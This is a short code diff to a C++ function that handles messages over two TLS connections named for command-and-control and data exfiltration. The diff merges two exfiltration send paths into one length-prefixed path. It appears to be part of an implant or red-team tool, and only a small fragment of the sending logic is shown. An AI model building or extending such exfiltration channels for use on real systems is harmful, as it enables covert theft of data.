@@ -160,12 +160,8 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     } else {
         c2_response = "ERR " + id;
     }
-
-    if (exfil_ssl && !exfil_data.empty() && type == 'T') {
-        SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
-    }
     
-    if (exfil_ssl && !exfil_data.empty() && type == 'F') {
+    if (exfil_ssl && !exfil_data.empty()) {
         uint32_t payload_size = htonl(static_cast<uint32_t>(exfil_data.size()));
 
         std::vector<char> buffer;
